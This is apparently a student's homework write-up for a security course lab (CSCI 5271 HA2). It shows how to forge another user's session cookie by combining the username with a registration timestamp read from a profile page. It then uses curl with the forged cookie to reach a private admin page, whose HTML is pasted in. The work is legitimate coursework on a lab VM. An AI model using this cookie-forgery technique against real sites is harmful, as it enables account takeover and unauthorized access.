Reference: https://stackoverflow.com/questions/15995919/how-to-use-curl-to-send-cookies

test user registeration :
cookie’s value is test2019-11-10T04%3A16%3A46Z
Found that the cookie value starts with username and combines with register date and time(GMT)


The cookie value is the time that user registered.
After logging in as test, changing the url to be https://192.168.6.1/private/profile.php?username=Stephen. We can get Stephen’s registration time as Nov 03 2019 06:44:21 am. Change it to be GMT is Nov 03 2019 12:44:21 pm
The cookie value is  Stephen2019-11-03T12%3A44%3A21Z

Run this command in VM:
curl -u Stephen:pass -b cookie3.txt http://192.168.6.1/private/admin

Cookie3.txt is in the VM

 Then we can get the content of this private/admin page:
<!doctype html>
<head>
	<title>Admin - CSCI 5271 HA2</title>
	<link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body>

<div class='nav'>
<ul>
<li><a href='https://192.168.6.1/'>Home</a></li>
<li><a href='https://192.168.6.1/private/'>Fun Quotes</a></li>
<li><a href='https://192.168.6.1/thought'>Private Thoughts</a></li>
<li><a href='https://192.168.6.1/comment'>Visitor Comments</a></li>
</ul>

<span class='user_info'>
<ul><li>Signed in as <strong><a href='https://192.168.6.1/private/profile.php?username=Stephen'>Stephen</a></strong></li><li><a href='https://192.168.6.1/logout.php'>Sign out</a></li></ul>
</span>
</div>

<div class="article"><h3>Welcome back, Stephen!</h3><p>You have <strong>5</strong> new messages.</p><table>
		<tr><th>From</th><th>Subject</th></tr>
		<tr><td>Richard Stallman</td><td>Stuck on HA2 problem 3</li>
		<tr><td>Patrick Bateman</td><td> Re: Did you return the textbook?</li>
		<tr><td>Lil Wayne</td><td>Recommendation on papers?</li>
		<tr><td>Travis Carlson</td><td>Delay on grading HA2</li>
		<tr><td>Brad DeLong</td><td> The Ultimate Thanksgiving Movie Is: Addams Family Values</li>
	</table><center><img src="../img/hacking.gif"></center><p>
</div>
</body>
</html>

